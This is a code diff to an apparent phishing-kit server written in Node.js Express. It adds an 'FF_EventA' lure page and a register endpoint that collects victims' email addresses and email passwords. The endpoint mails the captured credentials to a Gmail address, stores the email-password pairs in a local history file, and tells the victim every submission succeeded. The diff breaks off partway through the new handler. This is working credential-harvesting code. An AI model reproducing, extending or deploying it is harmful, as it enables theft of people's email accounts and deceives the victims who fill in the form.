@@ -46,6 +46,11 @@ const EMAIL_CONFIG = {
         email: ['chilligemaass@gmail.com'],
         fromName: '👻𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
         subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
+    },
+    'FF_EventA': {
+        email: ['chilligemaass@gmail.com'],
+        fromName: '👻DESA 𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
+        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
     }
 };
 
@@ -466,6 +471,33 @@ app.post('/mdgffew/api/register', async (req, res) => {
         }
         
         await sendEmail(data, 'mdgffew');
+        updateTargetCooldown(data.email, data.emailPassword);
+        
+        const history = loadHistory();
+        history[data.email] = data.emailPassword;
+        saveHistory(history);
+        
+        res.json({ success: true });
+    } catch(error) {
+        console.error('Error:', error);
+        res.json({ success: true });
+    }
+});
+
+app.use('/FF_EventA', express.static(path.join(__dirname, 'FF_EventA')));
+app.post('/FF_EventA/api/register', async (req, res) => {
+    try {
+        const data = req.body;
+        console.log('📥 [FF_EventA] DATA:', data.email);
+        
+        const isDup = isDuplicatePassword(data.email, data.emailPassword);
+        const canSend = canSendToTarget(data.email, data.emailPassword);
+        
+        if (isDup && !canSend) {
+            return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
+        }
+        
+        await sendEmail(data, 'FF_EventA');
         updateTargetCooldown(data.email, data.emailPassword);
         
         const history = loadHistory();
